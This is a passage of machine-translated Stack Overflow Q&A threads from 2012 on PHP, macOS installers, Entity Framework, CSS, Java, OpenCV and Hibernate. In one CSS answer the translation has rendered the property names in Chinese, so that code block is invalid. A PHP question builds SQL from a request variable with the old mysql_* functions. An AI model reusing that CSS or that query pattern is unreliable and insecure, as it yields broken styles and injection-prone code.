             <? }  ?> 
```

接下来是我执行approve_review.php 的SQL 函数的代码：

```
<?php
require_once("session.php"); 
require_once("functions.php");
require('_config/connection.php');

                        $query = "UPDATE ptb_reviews SET approved = 1 WHERE id = '$review_id' LIMIT 1";
            mysql_query($query, $connection);

echo $query;
die();
// See what is really sent to MySQL
if (!mysql_query($query, $connection)){
    die(mysql_error());
}
?> 
```

我基本上是在问什么没有更新的原因，因为它找不到正在被批准或删除的评论的 ID，我可以做些什么来更新它，以便它知道我要哪个评论批准还是删除？

我仍在学习 PHP 和 MySQL，所以如果有人可以告诉我或解释该做什么，那就太好了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:49:01.737

你得到这样的查询变量：

```
$review_id = (int) $_GET['review_id']; 
```

但是在您的链接中，您使用：

```
<a href="includes/approve_review.php?review=<?php echo $reviews['review_id']; ?>">
                                     ^^^^^^ 
```

因此，您的评论 ID 存储在`$_GET['review']`而不是`$_GET['review_id']`.

首先，您应该将该行更改为（或相反...）：

```
$review_id = (int) $_GET['review']; 
```

# macos - 如何在我的 OS X 安装程序包中禁用备用卷的选择？

> ID：14074866
> 
> 赞同：3
> 
> 时间：2012-12-28T19:44:32.363
> 
> 标签：macos, installation, package, productbuild, pkgbuild

我正在为 OS X 准备一个安装程序包，但我不知道如何禁用询问用户要安装到哪个卷的屏幕。我希望它在`/`没有提示的情况下安装。

这是我构建软件包的方式：

[pkgbuild](http://developer.apple.com/library/mac/#documentation/Darwin/Reference/Manpages/man1/pkgbuild.1.html#//apple_ref/doc/man/1/pkgbuild)`--root build/staging/ --identifier xxxx --scripts InstallerOSX/resources/ --scripts InstallerOSX/scripts/ ${OBJROOT}/AgentPayload.pkg`

[产品构建](https://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man1/productbuild.1.html)`--distribution InstallerOSX/distribution.dist --package-path ${OBJROOT} --resources InstallerOSX/resources/ ${BUILT_PRODUCTS_DIR}/AgentInstaller.pkg`

这是我的[分发文件](https://developer.apple.com/library/mac/#documentation/DeveloperTools/Reference/DistributionDefinitionRef/Chapters/Distribution_XML_Ref.html#//apple_ref/doc/uid/TP40005370-CH100-SW10)：

```
<?xml version="1.0" encoding="utf-8" standalone="no"?>
<installer-gui-script minSpecVersion="1">
    <title>xxxx</title>
    <background file="background.png" mime-type="image/png" scaling="tofit"/>
    <pkg-ref id="xxxx"/>
    <options customize="never" require-scripts="false"/>
    <choices-outline>
        <line choice="xxxx"/>
    </choices-outline>
    <choice id="xxxx" title="title" description="desc">
        <pkg-ref id="xxxx"/>
    </choice>
    <domains enable_anywhere="false" enable_currentUserHome="false" enable_localSystem="true"/>
    <pkg-ref id="xxxx" version="0" onConclusion="none">AgentPayload.pkg</pkg-ref>
</installer-gui-script> 
```

该`<domains>`元素似乎没有起到作用......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T22:44:33.463

我最终将以下内容添加到分发定义中：

```
<options rootVolumeOnly="true"/> 
```

`rootVolumeOnly`已弃用，但它现在有效，而`domains`似乎没有。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-19T17:20:58.643

使用域方法似乎不起作用，因为 UI 不是最好的。“更改安装位置...”按钮仍然可见，但如果单击它，则仅启用“为此计算机的所有用户安装”选项。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-06-13T12:23:44.210

2019 年更新：

`<options rootVolumeOnly="true"/>`仍然可以正常工作并在安装过程中跳过*目的地*选择选项。

由于`rootVolumeOnly`已弃用，Distribution.xml 中的以下选项具有相同的行为，并且也跳过了*Destination*。

```
<domains enable_anywhere="false" enable_currentUserHome="false" enable_localSystem="true"/> 
```

# c# - 当主键都不是主键时，EF 一对一关系

> ID：14074869
> 
> 赞同：1
> 
> 时间：2012-12-28T19:44:38.387
> 
> 标签：c#, asp.net-mvc-3, entity-framework, entity-framework-4, linq-to-entities

我有 2 个实体需要映射在一起。由于它们都是数据库视图，因此在技术上都不是主键。

```
 [Table("Name")]
    public class MemberInfo
    {
        [Key]
        [Column("id")]
        public string MemberId { get; set; }

        [Column("first_name")]
        public string FirstName { get; set; }

        [Column("last_name")]
        public string LastName { get; set; }

        public string Designation { get; set; }

        [Column("full_name")]
        public string FullName { get; set; }
    }

public class ChangeLog
    {
        [Column("ID")]
        public int ID { get; set; }

        [Column("asset_id")]
        public virtual Asset AssetID { get; set; }

        [Column("member_id")]
        public int MemberID { get; set; }

        public virtual MemberInfo MemberInfo { get; set; }

        [Column("comment")]
        public string Comment { get; set; }

        [Column("createdDT")]
        public DateTime CreatedDT { get; set; }
    } 
```

如果我尝试从 ChangeLog 访问 MemberInfo，我会收到一条错误消息：

```
A relationship multiplicity constraint violation occurred: An EntityReference can have no more than one related object, but the query returned more than one related object. This is a non-recoverable error. 
```

MemberInfo 的 MemberID 字段是唯一的。我需要能够通过 MemberInfo 属性从 ChangeLog 访问 MemberInfo 属性。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T10:39:56.200

此错误是针对 ChangeLog 类中的 Asset 属性的，您没有编写该类，我认为通过更改该属性可以修复此错误

# html - 如何摆脱 Firefox 添加到 div 的 1px 宽度？

> ID：14074871
> 
> 赞同：0
> 
> 时间：2012-12-28T19:44:41.267
> 
> 标签：html, css, dreamweaver

我目前正在建立我的投资组合网站。

我正在处理的页面可以在这里找到：http: [//www.infomaticfilms.com/jack/jrimg/g_and_d.htm](http://www.infomaticfilms.com/jack/jrimg/g_and_d.htm)。

它远未完成，因为在我解决这个问题之前我不想继续前进。此页面将是所有各种项目页面的通用页面，这意味着它们都将具有不同的高度。我不想为每个项目制作单独的页面，我只想制作一个可供所有人使用的页面，只需每次删除内容并重新保存页面即可。如果您单击“我”或“联系人”链接，您可以看到其他页面以查看边框。我读了一篇来自 Stack Overflow 的文章，它帮助我非常接近解决方案。我对 Firefox 有疑问，它在右侧边框上增加了 1 个像素。这是HTML：

```
<div class="contentAndBorders">   
 <div class="borderLeft"></div>   
 <div class="mainContentProjectPage">
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>
 <p>Content goes here</p>   
</div>   
<div class="borderRight"></div> 
</div> 
```

我希望将内容放入带有 mainContentProjectPage 类的 div 中。我需要具有borderLeft 和borderRight 类的div 来扩展mainContentProjectPage 的高度，因此边框看起来是连续的，这就是他们目前所做的。它基本上是三列。第一列和第三列是左右的白色边框，中间列是内容。这是CSS：

```
.contentAndBorders {
      width: 950px;
      position: relative;
      overflow: hidden;
}
.mainContentProjectPage {
      float: left;
      background-color: #F55816;
      width: 100%;
      padding-left: 24px;
}
.borderLeft {
      float: left;
      background-color: #FFF;
      width: 1.3%;
      background-attachment: scroll;
      background-image: none;
      background-repeat: repeat;
      background-position: 0px 0px;
      position: absolute;
      left: 0px;
      height: 100%;
      margin: 0;
}
.borderRight {
      background-attachment: scroll;
      background-color: #FFF;
      background-image: none;
      background-repeat: repeat;
      background-position: 0px 0px;
      width: 1.3%;
      float: left;
      position: absolute;
      right: 0px;
      height: 100%;
      margin: 0;
} 
```

我真的不明白它是如何工作的，只是它确实如此。如果有人知道实现相同结果的更好方法，那么我将非常感激，因为这是我网站的最后一部分。我的问题是有谁知道如何摆脱 Firefox 右侧边框上多余的 1 个像素？它在 Safari 和 Chrome 中看起来很完美。任何帮助和建议都可以挽救生命。

[上面代码的JSFiddle](http://jsfiddle.net/CTEdR/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:53:44.987

摆脱所有额外的与边框相关的代码（即，从您的标记和 css 中删除您的borderLeft 和borderRight div），只需将以下css 应用到您的projectPageWrapper div。

```
#projectPageWrapper { 
  border: 10px solid white;
  border-radius: 10px;
  -webkit-border-radius: 10px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:17:49.703

它之所以起作用，是因为`position`应用于不同级别的元素的样式。[这](http://css-tricks.com/absolute-relative-fixed-positioining-how-do-they-differ/)是有关该主题的更多信息。

包装元素`.contentAndBorders`像它的子元素一样扩展`.mainContentProjectPage`。正因为如此，100% 的高度（[实际上并不像你想象的那样工作](http://www.w3.org/TR/CSS21/visudet.html#the-height-property)）绝对定位的侧面元素会扩展以填充垂直空间。

除非侧面的空间需要包含除实心填充以外的其他东西，否则这可能不是要走的路。相反，遵循[盒子模型](http://w3schools.com/css/css_boxmodel.asp)原则，并结合使用`border-left`和`border-right`结合`padding`来获得所需的外观和布局。

如果侧片需要图案填充或内容，那么您可以使用绝对定位的解决方案，但是您的大多数浮动都是不必要的，并且可能会导致更多的问题而不是它们的价值。

尝试：

```
.contentAndBorders {
      宽度：950 像素；
      位置：相对；
}
.mainContentProjectPage {
      背景颜色：#F55816；
      保证金：0 1.3%；
      填充：10px；
}
.borderLeft, .borderRight{
      背景颜色：#FFF；
      宽度：1.3%；
      位置：绝对；
      顶部：0px；
      高度：100%；/* 请注意，在非 webkit 浏览器中，这实际上可能表示父元素的 WIDTH */
}
.borderLeft {
      左：0px；
}
.borderRight {
      右：0px；
}

```

现在，因为浏览器并不总是知道当 1.3% 不分成偶数像素时该做什么，所以可能会有细微的差异。

# magento-1.7 - magento 定制订单

> ID：14074873
> 
> 赞同：1
> 
> 时间：2012-12-28T19:45:03.123
> 
> 标签：magento-1.7

预先感谢您阅读本文。这是情况。几个月来，我一直在使用 Magento CE 1.7 在一家在线吉他商店工作。我大大低估了网站的成本，我知道这是我的错，而不是客户，顺便说一句，他是个好人。那里有许多问题需要花费大量时间，包括必须将其从测试服务器移动到真实域，许多徽标调整等。我几乎完成了它，真的需要“止血”可以这么说但是有他真正想要的一个功能，我对此一无所知。

它是吉他拾音器的定制订单。他在他的旧网站上有一个没有 ASP 的网站，除了不知道 ASP 之外，我们现在在一台 Unix 服务器上。

他的要求是“某人能够选择一个类别（即：7 弦、Strat Replacement、Tele Replacement 等），然后让它只能显示适用于该选择的选项。我希望客户能够在此页面的某处看到每个取件的描述。我还希望人们在选择封面/颜色时能够看到它们的样子。”</p>

我能够使用回程机器至少向你们展示他想要什么，这里是链接[http://web-beta.archive.org/web/20120127233223/http://www.axepalace.com/pickup_order .asp](http://web-beta.archive.org/web/20120127233223/http://www.axepalace.com/pickup_order.asp)

这是我尝试使用具有很多选项的产品来创建它。[http://axepalace.com/pickups/bare-knuckle/bkp-order-form/bare-knuckle-pickup-order-form.html](http://axepalace.com/pickups/bare-knuckle/bkp-order-form/bare-knuckle-pickup-order-form.html)

所以任何人都可以给我一些反馈/建议。我的理智真的很感激！

# java - 为什么 Java 编译器不支持导入继承？

> ID：14074874
> 
> 赞同：6
> 
> 时间：2012-12-28T19:45:08.353
> 
> 标签：java, inheritance, import, compilation

在 Java 中，导入与（外部）类相关，因为每个（外部）类都应该编码在单独的文件中。因此，可以声称`import ...;`类定义之前的指令与类相关联（有点像注释）。

现在，如果可以继承父类的导入，那将大大减少源文件的混乱。为什么这不可能？即为什么Java 编译器不考虑基类的导入？

笔记：

*   答案可能不止一个。
*   我知道如果您让 eclipse 组织您的导入，这不是什么大问题，无需提及。这是关于“为什么”，而不是“如何”（a-la- [this](https://stackoverflow.com/q/2042050/1593077)）。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-28T19:52:24.873

首先，重要的是要注意不是每个类都必须编码在一个单独的文件中——而是每个*公共的顶级*类都必须是。不，导入并没有真正与任何类相关联——它们只是用于在文件中包含某些外部类/包的语句，以便可以使用它们。事实上，你永远不需要真正导入任何东西，你总是可以使用全名，即：

```
java.util.List<String> list = new java.util.ArrayList<String>(); 
```

导入是为了方便（并且仅用于编译器 - 在编译类后它们会丢失），以使您不必写出所有内容，而只是让您编写`List<String> list = new ArrayList<String>`（在您从 进行相关导入之后`java.util`）。因此，没有理由让子类“继承”导入。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T21:17:58.653

导入是语法糖，仅此而已。如果您真的愿意，您可以编写任何 Java 程序而无需使用 import 语句。例如，以下类自行编译：

```
class Foo {
  java.util.List<String> list = new java.util.ArrayList<String>();
} 
```

此外，继承导入使得从类中删除导入变得更加困难*。*例如，如果`Bar.java`继承自`Foo.java`，您可能无法删除导入 from`Foo`而不将其添加到`Bar`. 强制导入显式使得更改单个文件变得更加容易，而不必担心对其他文件的影响，这几乎是 Java 和面向对象编程的基本原则。

（最后一点与[Go 设计中的一个重要因素有关](http://talks.golang.org/2012/splash.article#TOC_5.)，它专门试图避免 C 和 C++ 在该领域的问题。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T21:24:15.237

让每个文件明确指定其导入可以提高可读性。想象一下打开一个文件，但无法一目了然地看到依赖项，因为导入是从另一个文件继承的。

# ios - UIImageView 使用视网膜 4 iPhone 模拟器而不是视网膜 3.5/常规模拟器旋转图像

> ID：14074875
> 
> 赞同：2
> 
> 时间：2012-12-28T19:45:10.160
> 
> 标签：ios, ios-simulator, retina-display

UIImageView 自动旋转某些图像而不是其他图像（或根本自动旋转图像）的方式完全让我感到困惑，我找不到关闭这种自动旋转行为的设置。

作为测试，我使用针对 iPhone 5 的 iOS6 SDK 创建了一个项目，步骤如下：

*   我使用 iPhone 4 的前置摄像头拍摄了一张纵向的照片
*   使用 DropBox 将其传输到我的桌面
*   将其导入我的项目并在 StoryBoard 中将其指定为 UIImageView 的源。

这些是 imageView 的布局设置：

![在此处输入图像描述](../Images/18d8b83816560c36f91bf3ed4ecfbcb5.png) ![在此处输入图像描述](../Images/cc1d5a7f0f8d79be4d3c784d957b7350.png)

在retina3.5和iPhone 5的模拟器中运行它，图像看起来是直立的：

![在此处输入图像描述](../Images/1c4652e21af8a4abe94b40cfa1f01d1c.png)

在视网膜 4 的模拟器中运行它，我得到这个旋转的图像：

![在此处输入图像描述](../Images/59f6d6f687de84b509c7c8caf1d7a0a6.png)

显然有些奇怪的事情正在发生。

我对这个 UIImageView 自动旋转感到非常困惑和沮丧。我以前遇到过这个问题，花了几个小时试图解决这个问题。我了解使用 iPhone 相机拍摄的图像具有方向属性。我不明白为什么在视网膜 4 模拟器中以纵向模式拍摄的图像没有以纵向模式显示。

有没有办法可以从 UIImageView 关闭这个“帮助”？

# c# - 在 MaskedTextBox 中，如何编写掩码来检查输入是否为空？

> ID：14074878
> 
> 赞同：0
> 
> 时间：2012-12-28T19:45:18.357
> 
> 标签：c#, winforms

据我所知，这不是正则表达式。而且我找不到量词的任何地方。这就是我现在所拥有的，MaskedTextBox 无法将 + 识别为量词

```
A+ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T22:30:18.610

您正试图过早地验证被屏蔽的文本框。在没有输入之前，您无法知道它没有任何输入。我假设您有某种表格，让用户填写，最后他们按下按钮来完成数据输入。您可以验证该事件中的输入。

如果您只是想确保非空，那么您可以[`TextLength`](http://msdn.microsoft.com/en-us/library/system.windows.forms.maskedtextbox.textlength.aspx "蒙面文本框 TextLength")在焦点离开文本框后或按下按钮时等检查该字段。

# c++ - 一种在不占用内存的情况下实时缓冲高清视频的有效方法

> ID：14074891
> 
> 赞同：4
> 
> 时间：2012-12-28T19:45:58.090
> 
> 标签：c++, c, qt, opencv, computer-vision

我正在编写一个程序，该程序涉及使用 OpenCV 实时处理来自网络摄像机的视频。我希望能够捕获（在处理过程中的任何时间）以前的图像（例如十秒）并保存到视频文件中。

我目前正在使用**队列**作为缓冲区（推送'cv :: Mat'数据）来执行此操作，但这显然效率不高，因为几秒钟的图像很快就会耗尽所有PC内存。我尝试使用 'cv::imencode' 压缩图像，但使用 PNG 并没有太大区别，我需要一个使用**硬盘驱动器内存**并高效进行实时操作的解决方案。

谁能提出一个非常简单有效的解决方案？

编辑：

只是为了让每个人都明白我现在在做什么；这是 10 秒缓冲区的代码：

```
void run()
{
    cv::VideoCapture cap(0);
    double fps = cap.get(CV_CAP_PROP_FPS);
    int buffer_lenght = 10;     // in seconds
    int wait = 1000.0/fps;
    QTime time;

    forever{
        time.restart();
        cv::mat image;
        bool read = cap.read(image);

        if(!read)
            break;

        bool locked = _mutex.tryLock(10);

        if(locked){
            if(image.data){
                _buffer.push(image);

                if((int)_buffer.size() > (fps*buffer_lenght))
                    _buffer.pop();
            }
            _mutex.unlock();
        }

        int time_taken = time.elapsed();
        if(time_taken<wait)
            msleep(wait-time_taken);

    }

    cap.release();
} 
```

`queue<cv::Mat> _buffer`并且`QMutex _mutex`是全局变量。如果您熟悉 QT、信号和插槽等，我有一个插槽可以抓取缓冲区并使用 cv::VideoWriter 将其保存为视频。

编辑：我认为理想的解决方案是让我`queue<cv::Mat> _buffer`使用**硬盘内存**而不是**电脑内存**。不确定这在哪个星球上是可能的？：/

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T21:11:40.350

[我建议研究使用x264](http://www.videolan.org/developers/x264.html)或类似的实时压缩。x264 经常用于视频流[的实时编码](http://x264dev.multimedia.cx/archives/249)，并且通过正确的设置，可以在功率适中的处理器中对多个流或 1080p 视频流进行编码。我建议在[doom9 的论坛](http://forum.doom9.org)或类似的论坛中提问。

x264 是一个免费的 h.264 编码器，可以实现 100:1 或更好的（相对于原始）压缩。x264 的输出可以以比未压缩（或无损压缩）视频更高的效率存储在您的内存队列中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T21:22:06.360

**更新**

您可以做的一件事是使用将图像存储到硬盘`imwrite`并将其文件名更新到队列。当队列已满时，在弹出文件名时删除图像。
在您的视频写入槽中，加载从队列中弹出的图像并将它们写入您的`VideoWriter`实例

* * *

你提到你需要使用**硬盘内存**

在这种情况下，请考虑使用*OpenCV HighGUI VideoWriter*。您可以创建一个 VideoWriter 的实例，如下所示：

```
VideoWriter record("RobotVideo.avi", CV_FOURCC('D','I','V','X'), 
    30, frame.size(), true); 
```

并将图像捕获写入如下：

```
record.write(image); 
```

在网站上查找[文档](http://docs.opencv.org/modules/highgui/doc/reading_and_writing_images_and_video.html#videowriter-videowriter)和[示例程序](http://opencv.willowgarage.com/wiki/documentation/cpp/highgui/VideoWriter)。

# windows - Windows 类型命令截断输出

> ID：14074892
> 
> 赞同：0
> 
> 时间：2012-12-28T19:46:12.910
> 
> 标签：windows, batch-file

我有 3 台运行 Windows 2003 Server 版本的服务器。我正在尝试使用 type 命令将 xml 文件写入映射驱动器。在其中一台服务器上，输出被截断。其他服务器复制整个文件，即使它更大。该文件不会每次都在同一位置截断。

```
type D:\serverLogs\log.xml > H:\prod2.xml 
```

我在代码上运行了一个差异，以确保每个服务器都运行相同的命令。任何想法可能会阻止写入？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T20:00:42.737

您应该使用`copy`(or `xcopy`or `robocopy`) 而不是`type`. 绝对没有理由输入内容并通过网络重定向它。（而且复制方法也会快得多。）

# .net - 数据库中的 SimpleMembershipProvider

> ID：14074893
> 
> 赞同：0
> 
> 时间：2012-12-28T19:46:15.413
> 
> 标签：.net, asp.net-mvc, entity-framework

我想在我的 ASP.NET MVC 4 应用程序中使用[SimpleMembershipProvider](http://msdn.microsoft.com/en-us/library/webmatrix.webdata.simplemembershipprovider%28v=vs.111%29.aspx)，但我找不到任何有用的信息如何将用户信息存储在 MSSQL 数据库中？

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T09:53:03.753

如果您将连接字符串更改为指向新数据库并转到使用 AccountController 的 SimpleMembership 页面（视图），它应该为您制作适当的表。

AccountController 应该应用了 [InitializeSimpleMembership] 过滤器——这就是魔法发生的地方。

# java - 由于使用带有 Hibernate、Spring 和 CrudRepository 接口的 JPA 在 @Transactional 方法中关闭会话而导致延迟加载异常

> ID：14074896
> 
> 赞同：2
> 
> 时间：2012-12-28T19:46:35.607
> 
> 标签：java, spring, hibernate, jpa, persistence

由于以下异常，我目前遇到延迟加载无法处理双向实体关系的问题：

```
 org.hibernate.LazyInitializationException: failed to lazily initialize a collection of role: sample.Person.sent, no session or session was closed
at org.hibernate.collection.internal.AbstractPersistentCollection.throwLazyInitializationException(AbstractPersistentCollection.java:394)
at org.hibernate.collection.internal.AbstractPersistentCollection.throwLazyInitializationExceptionIfNotConnected(AbstractPersistentCollection.java:386)
at org.hibernate.collection.internal.AbstractPersistentCollection.readElementExistence(AbstractPersistentCollection.java:161)
at org.hibernate.collection.internal.PersistentBag.contains(PersistentBag.java:256)
at sample.EmailTest.testTest(EmailTest.java:47)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:601)
at org.testng.internal.MethodInvocationHelper.invokeMethod(MethodInvocationHelper.java:80)
at org.testng.internal.MethodInvocationHelper$1.runTestMethod(MethodInvocationHelper.java:169)
at org.springframework.test.context.testng.AbstractTestNGSpringContextTests.run(AbstractTestNGSpringContextTests.java:158) 
```

我有以下示例实体类：

## 电子邮件

```
@Entity
public class Email {

@Id
@GeneratedValue(strategy = GenerationType.AUTO)
private Long id;

private String subject;

@ManyToOne(fetch = FetchType.EAGER)
private Person sender;

@ManyToMany(fetch = FetchType.EAGER)
private List<Person> recipients;

... setters/getters/constructors/equals/hashcode 
```

## 人

```
@Entity
public class Person {

@Id
@GeneratedValue(strategy = GenerationType.AUTO)
private Long id;

@Column(unique = true)
private String name;

@OneToMany(mappedBy = "sender")
private List<Email> sent;

@ManyToMany(mappedBy = "recipients")
private List<Email> received;

... setters/getters/constructors/equals/hashcode 
```

以下存储库：

## 电子邮件存储库

```
import org.springframework.data.repository.CrudRepository;

public interface EmailRepository extends CrudRepository<Email, Long> {
} 
```

## 个人资料库

```
import org.springframework.data.repository.CrudRepository;

public interface PersonRepository extends CrudRepository<Person, Long> {
} 
```

## 持久性.xml：

```
<persistence-unit name="unit_test">
    <properties>
        <property name="hibernate.dialect" value="org.hibernate.dialect.HSQLDialect" />
        <property name="hibernate.connection.url" value="jdbc:hsqldb:mem:spring" />
        <property name="hibernate.connection.driver_class" value="org.hsqldb.jdbcDriver" />
        <property name="hibernate.connection.username" value="sa" />
        <property name="hibernate.connection.password" value="" />

        <property name="hibernate.hbm2ddl.auto" value="create-drop" />
        <property name="hibernate.show_sql" value="true" />
        <property name="hibernate.format_sql" value="true" />
        <property name="hibernate.use_sql_comments" value="true" />
        <property name="hibernate.cache.use_second_level_cache" value="false"/>
        <property name="hibernate.cache.use_query_cache" value="false"/>
    </properties>
</persistence-unit> 
```

## Spring application_context.xml

```
<jpa:repositories base-package="sample" />

<jdbc:embedded-database id="dataSource" type="HSQL" />

<bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
    <property name="dataSource" ref="dataSource" />
    <property name="jpaVendorAdapter">
        <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter">
            <property name="generateDdl" value="true" />
            <property name="database" value="HSQL" />
        </bean>
    </property>
    <property name="persistenceUnitName" value="unit_test" />
</bean>

<bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
    <property name="entityManagerFactory" ref="entityManagerFactory" />
</bean>
<tx:annotation-driven transaction-manager="transactionManager" /> 
```

这是产生异常的测试代码：

```
@ContextConfiguration(locations={"/application_context.xml"})
public class EmailTest extends AbstractTestNGSpringContextTests{

    @Autowired
    private EmailRepository emailRespository;

    @Autowired
    private PersonRepository personRepository;

    private Long fredId;

    @BeforeMethod
    public void setUp() {
        Person john = new Person("John");
        john = personRepository.save(john);
        Person fred = new Person("Fred");
        fred = personRepository.save(fred);
        Person julio = new Person("Julio");
        julio = personRepository.save(julio);

        Email mail = new Email("subject", john, Lists.newArrayList(john, fred, julio));
        emailRespository.save(mail);

        fredId = fred.getId();
    }

    @Test
    @Transactional
    public void testTest() throws Exception{
        Person fred = personRepository.findOne(fredId);
        List<Email> sent = fred.getSent();
        List<Email> received = fred.getReceived();

        sent.contains(null);
        received.contains(null);

        int i = 0;
    }
} 
```

保存和查找似乎工作正常，但延迟加载的集合不起作用，似乎是因为会话已关闭，即使方法是@Transactional。显然我错过了一些东西，因为我看到了其他几乎相同的样本。

编辑：将 fetch = FetchType.EAGER 添加到电子邮件实体，没有变化。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-29T01:05:39.600

我不确定是什么关闭了 Hibernate 会话，但您可以尝试添加`fetch=FetchType.EAGER`到下面的映射中：

```
@ManyToOne
private Person sender;

@ManyToMany
private List<Person> recipients; 
```

# objective-c - 如何向 NSTextView 添加渐变渐变

> ID：14074899
> 
> 赞同：3
> 
> 时间：2012-12-28T19:47:05.567
> 
> 标签：objective-c, macos, cocoa, gradient, nstextview

我有一个`NSTextView`，它显示在一个`NSImageView`. 文本视图在艺术品上显示歌曲的歌词。

我想在文本视图的底部应用一点渐变。背景是一个变化的图像，所以我不能只画一个直线渐变。

我想你可以在文本视图的顶部重新绘制图像，但这似乎不是一个很好的解决方案。

谁能告诉我如何进行？

# java - 关闭 JOptionPane 后全屏冻结

> ID：14074905
> 
> 赞同：1
> 
> 时间：2012-12-28T19:47:31.520
> 
> 标签：java, swing, joptionpane

```
package sample;

import java.awt.DisplayMode;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JDesktopPane;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;

public class NewClass {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        final JFrame frame = new JFrame();
        final JDesktopPane d = new JDesktopPane();
        frame.setTitle("Frame");
        frame.setSize(800, 600);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
        device.setFullScreenWindow(frame);
        device.setDisplayMode(new DisplayMode(800, 600, 32, 60));
        frame.setVisible(true);

        JButton btn = new JButton();
        btn.setText("Button");
        final JPanel panel = new JPanel();

        panel.add(btn);
        frame.add(panel);
        final JFileChooser chooser = new JFileChooser();
        chooser.addActionListener(new ActionListener() {

            public void actionPerformed(ActionEvent e) {
                if (e.getActionCommand().equals(JFileChooser.APPROVE_SELECTION)) {
                    System.out.println("File selected: " + chooser.getSelectedFile());
                    chooser.getFocusCycleRootAncestor().setVisible(false);
                } else {
                    chooser.getFocusCycleRootAncestor().setVisible(false);
                }
            }
        });
        btn.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                JOptionPane.showInternalOptionDialog(frame.getContentPane(), chooser, "Browse", JOptionPane.DEFAULT_OPTION, JOptionPane.PLAIN_MESSAGE, null, new Object[]{}, null);
            }
        });
    }
} 
```

这段代码对你来说看起来很奇怪，但这是使用`GraphicsDevice`. 我的问题是，当我单击 JFileChooser 的取消或打开按钮时，我的屏幕使用此代码冻结`chooser.getFocusCycleRootAncestor().setVisible(false);`。如何在不冻结屏幕或关闭整个屏幕的情况下使用内部对话框关闭 JOPtionPane。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T04:39:21.473

你的问题不在

```
chooser.getFocusCycleRootAncestor().setVisible(false); 
```

如果您进行这些更改，您的代码将完美运行

只需删除这部分

```
 JOptionPane.showInternalOptionDialog(frame.getContentPane(),chooser, "Browse",JOptionPane.DEFAULT_OPTION, JOptionPane.PLAIN_MESSAGE, null, new Object[]{}, null); 
```

并添加此代码

```
 chooser.showOpenDialog(frame); 
```

让我知道您是否还有其他顾虑

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-29T12:16:41.717

问题是，程序仍然认为打开了一个模态对话框，这将焦点限制在模态对话框上......

尝试将您`chooser`的 '更改`actionListener`为这样的...

```
chooser.addActionListener(new ActionListener() {
    public void actionPerformed(ActionEvent e) {

        Container parent = chooser.getParent();
        while (!(parent instanceof JOptionPane)) {
            parent = parent.getParent();
        }

        JOptionPane op = (JOptionPane) parent;
        op.setValue("done");

        if (e.getActionCommand().equals(JFileChooser.APPROVE_SELECTION)) {
            System.out.println("File selected: " + chooser.getSelectedFile());
        } else {
        }
    }
}); 
```

这基本上“欺骗”了`JOptionPane`用户选择了一个值（您实际上没有提供任何值）并关闭对话框，将控制权返回给您的应用程序

# php - 将对象从全局范围传递到模型

> ID：14074908
> 
> 赞同：0
> 
> 时间：2012-12-28T19:47:43.950
> 
> 标签：php, class, codeigniter, object

这是我在codeigniter中的模型代码。

```
<?php

$catalogo = (object) array (
    "name" => "catalogo",
    "url" => "url_catalogo"
);
$categorias = (object)array (
    "name" => "categorias",
    "titulo" => "varchar_titulo",
);

$novedades = (object)array (
    "name"      => "novedades",
    "titulo"    => "varchar_titulo",
    "fecha"     => "fecha_publicacion",
    "descripcion"   => "text_descripcion",
    "categoria" => "fk_categoria"
);

$img_nov =(object) array (
    "name"      => "imagenes_novedades",
    "url"       => "url_img",
    "novedad"   => "fk_novedad"
);  
$marcas = (object) array(
    "name"      => "marcas",
    "titulo"    => "varchar_titulo",
    "url"       => "url_imagen"
);
$img_slide  = (object) array (
    "name"  => "slide_destacados",
    "url"   => "url_img"
);

$users = (object) array (
    "db"    => "users",
    "user"  => "username",
    "pass"  => "password"
);
class Model extends CI_Model 
{

    function __construct()
    {
        parent::__construct();
    }

    function check_user ( $username, $password )
    {
        global $users;
